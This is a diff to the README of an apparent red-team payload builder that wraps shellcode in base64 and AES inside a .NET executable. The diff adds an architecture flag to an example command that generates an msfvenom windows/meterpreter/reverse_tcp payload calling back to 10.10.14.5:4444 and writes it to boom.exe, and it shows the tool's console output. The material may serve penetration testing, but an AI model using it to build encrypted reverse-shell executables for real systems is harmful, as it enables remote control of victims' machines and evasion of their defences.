@@ -6,9 +6,9 @@ To generate a .Net binary containing base64 encoded, AES encrypted shellcode tha
 
 # Instructions
 
-Use the `builder.py` to create the executable (you will need `mono` installed on your Linux box:
+Use the `builder.py` to create the executable (you will need `mono` installed on your Linux box):
 ```
-root@kali:~# ./launcher.py -p windows/meterpreter/reverse_tcp --lport 4444 --lhost 10.10.14.5 --key my_super_key -f boom.exe
+root@kali:~# ./launcher.py -p windows/meterpreter/reverse_tcp --arch x86 --lport 4444 --lhost 10.10.14.5 --key my_super_key -f boom.exe
 [+] Generating MSFVENOM payload...
 [+] Encrypting the payload...
 [+] Generating launcher.cs file...
